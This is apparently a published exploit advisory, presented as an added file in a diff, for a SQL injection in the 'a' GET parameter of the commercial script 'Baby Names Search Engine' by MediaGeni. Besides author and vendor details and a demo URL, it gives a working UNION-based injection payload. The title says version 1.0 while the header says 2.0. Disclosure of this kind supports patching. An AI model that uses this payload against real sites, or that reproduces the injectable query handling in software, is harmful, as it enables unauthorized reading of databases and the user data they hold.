@@ -1,0 +1,27 @@
+# Exploit Title: Baby Names Search Engine v1.0 - 'a' SQL Injection
+# Dork: N/A
+# Date: 27.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor: MediaGeni
+# Vendor Homepage:
+https://codecanyon.net/item/baby-names-search-engine/11864316
+# Version: 2.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The vulnerability allows an attacker to inject sql commands
+from search section with 'a' parameter.
+====================================================
+
+# PoC : SQLi :
+
+Parameter: a (GET)
+
+    Type: UNION query
+    Demo:
+http://www.site.com/index.php?q=test&M=true&F=true&a=Turkish&type=3
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: q=test&M=true&F=true&a=Turkish' UNION ALL SELECT
+NULL,CONCAT(CONCAT('qzjqq','syfofZIoCuhULUBWOuONCiDLDFbwXYyhSdAJvCBU'),'qbzxq'),NULL,NULL--
+ZYcF&type=3
+
+====================================================
